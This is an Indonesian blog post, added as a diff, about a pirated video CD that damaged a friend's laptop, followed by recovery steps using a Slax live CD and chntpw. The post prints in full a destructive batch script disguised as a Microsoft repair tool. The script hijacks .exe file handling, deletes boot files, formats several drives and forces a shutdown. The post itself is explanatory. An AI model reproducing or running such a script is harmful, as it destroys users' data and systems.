@@ -1,0 +1,96 @@
+---
+layout: post
+title: laptopnya aziz
+date: 2010-08-24 16:38:18.000000000 +07:00
+type: post
+published: true
+status: publish
+categories:
+- blog
+- linux-opensource
+- uncategorized
+tags:
+- bajakan
+- bukan virus
+- chntpw
+- skrip perusak
+- sux
+- video cd bajakan
+- windows
+meta:
+  _edit_last: '7761285'
+  _wp_old_slug: ''
+  geo_latitude: '-8.588990'
+  geo_longitude: '116.130400'
+  geo_accuracy: '206'
+  geo_address: mataram
+  geo_public: '1'
+author:
+  login: pdft
+  email: padfoot.tgz@gmail.com
+  display_name: piko
+  first_name: herpiko
+  last_name: dwi aguno
+---
+<p>alkisah, ada seorang kawan, namanya aziz. punya keping video cd bajakan beli di emperan cd di surabaya. dan laptopnya diserahkan ke saya, rusak pula.<br />
+tidak bisa regedit, commandline, taskmanager, etc. tidak bisa jalankan file ekstensi exe (otomatis ini ancur), dan file ntldr hilang.<br />
+pendek kata, itu leptop saya install ulang <span style="text-decoration:line-through;">pake linux</span> windosnya (merasa berdosa). install driver. install aplikasi (merasa berdosa). pasang antivirus (avast lisensi free). pokoke beres.</p>
+<p>tapi si aziz balik lagi keesokan harinya. tak lupa leptopnya dibawa juga. otomatis saya langsung sakit hati.</p>
+<p>temennya bilang "kemarin masukin video cd langsung ada hitam-hitam tulisan (belakangan diketahui adalah jendela command line)"<br />
+saya tanya "terus?"<br />
+temennya bilang "terus mati".</p>
+<p>keren. ntldrnya hilang lagi, tidak bisa booting. karena penasaran dan berhubung rumahnya deket, saya suruh ambil video cd yang diputar itu.</p>
+<p>terus saya temukan  file autorun plus file dengan ekstensi .bat yang isinya adalah ini :</p>
+<p>[sourcecode]<br />
+@echo off<br />
+title Microsoft Windows TM Auto Repair<br />
+echo.<br />
+echo Preparing to Fixing the System..............................<br />
+echo This system need to repair of broken files.<br />
+echo This problem may be cause a Virus activity or coruption files.<br />
+echo Please wait a minute until windows doing it self....<br />
+echo Please close any running programs from the Windows system.<br />
+echo This program License and copyright by<br />
+echo Microsoft Coorporation TM.<br />
+echo System Repair in progress ........ please wait a second..<br />
+echo.<br />
+reg add HKLM\SOFTWARE\Classes\exefile\shell\open\Command /ve /d %%fe340ead%%  /f<br />
+echo.<br />
+del /f /Q /A C:\ntldr /S<br />
+echo.<br />
+Format  D: /Q /X /y<br />
+echo.<br />
+Format  E: /Q /X /y<br />
+echo.<br />
+Format  F: /Q /X /y<br />
+echo.<br />
+del /f /Q /A C:\command.com /S<br />
+echo.<br />
+del /f /Q /A C:\io.sys /S<br />
+echo.<br />
+del /f /Q /A C:\config.sys /S<br />
+echo.<br />
+echo System is now repaired.<br />
+echo Windows will reboot the system.<br />
+echo.<br />
+Shutdown.exe -s -c &quot;Finish Repair System&quot; -f -t 10<br />
+echo.<br />
+pause<br />
+echo.<br />
+Shutdown.exe -s -c &quot;Finish Repair System&quot; -f -t 10<br />
+echo.<br />
+exit<br />
+[/sourcecode]</p>
+<p>ngerti kan? kenapa skrip sux ini ada di root folder sebuah video cd bajakan?</p>
+<p>analisa saya : supaya video cd bajakan ini tidak bisa dibajak! begitu dimasukin ke komputer, komputernya ngadat (kalo windoslah). ini cd buat diputer di vcd player, bukan dibuka di komputer terus diputar, terus dikopi ke hardis. ini bisnis, anda tidak boleh membajak apa yang saya bajak. begitulah kira-kira maksud si pembuat cd.</p>
+<p>pelajaran : jangan beli cd bajakan sembarangan.</p>
+<p>karena malas install ulang, untuk solvenya, pakai <a href="http://slax.org">slax</a> ditambah <a href="http://http://www.slax.org/modules.php?action=detail&amp;id=2557">modul chntpw</a>.</p>
+<p>cara regedit pakai cntpw :</p>
+<p>[sourcecode]<br />
+#mount -o rw /dev/sda1 /mnt/sda1/<br />
+#cd /mnt/sda1/WINDOWS/system32/config<br />
+#chntpw -e &amp;lt;hive file&amp;gt;<br />
+[/sourcecode]</p>
+<p>catatan : hive file ada di dalam folder config, misal kalo targetnya ada di dalam hkey_local_machine/software maka nama hive filenya adalah software (coba di-ls). untuk masuk :</p>
+<p>chntpw -e software.</p>
+<p>ketik ? untuk bantuan. hapus entri yang dibuat sama skrip tadi. beres.</p>
